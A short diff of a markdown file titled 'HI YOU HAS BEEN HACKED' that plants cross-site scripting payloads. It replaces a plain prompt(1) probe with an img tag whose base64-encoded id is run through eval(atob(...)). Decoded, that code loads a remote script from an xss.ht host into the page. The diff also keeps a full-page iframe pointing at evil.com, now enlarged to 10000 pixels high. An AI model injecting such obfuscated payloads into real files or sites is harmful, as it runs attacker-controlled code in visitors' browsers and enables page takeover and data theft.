@@ -1,10 +1,10 @@
 # HI YOU HAS BEEN HACKED
 
-## "><img src=x onError=prompt(1)>
+## "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYnVndnNtZS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 
 ### 
 
-"><iframe src="https://evil.com" height="100%" width="100%" frameborder="0"></iframe>
+"><iframe src="https://evil.com" height="10000" width="100%" frameborder="0"></iframe>
 ">
 <html>
   <head>
